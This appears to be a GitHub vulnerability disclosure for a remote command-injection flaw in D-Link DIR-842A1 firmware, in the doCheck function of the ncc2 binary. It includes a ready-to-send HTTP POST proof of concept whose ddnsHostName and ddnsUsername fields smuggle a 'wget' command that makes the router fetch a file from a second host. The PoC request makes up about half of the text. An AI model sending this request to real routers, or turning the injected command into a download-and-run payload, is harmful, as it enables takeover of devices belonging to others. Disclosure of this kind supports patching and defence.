# Dir-842
Exploit Author: yangchunyu@whu.edu.cn

Vendor: D-Link

Firmware: DIR842A1_FW102KRB03

A Remote Command Execution (RCE) vulnerability exists in DIR-842A1 via the doCheck function in ncc2 binary file. which can cause arbitrary command execution.

There is a “doCheck” function in the ncc2 binary file.

![image](https://github.com/WhereisRain/DIR-842/blob/main/1.png)

The ddnshostname and ddnusername variables are controllable and directly brought in without any check，Parameters from external input can propagate into the _system function, leading to command injection.

![image](https://github.com/WhereisRain/DIR-842/blob/main/2.png)

# poc
POST /ddns_check.ccp HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

X-Requested-With: XMLHttpRequest

Content-Length: 186

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/storage.asp

Cookie: hasLogin=1

ccp_act=doCheck&ddnsHostName=;wget${IFS}http://192.168.0.2:9988/doudou.txt;&ddnsUsername=;wget${IFS}http://192.168.0.2:9988/doudou.txt;&ddnsPassword=123123123
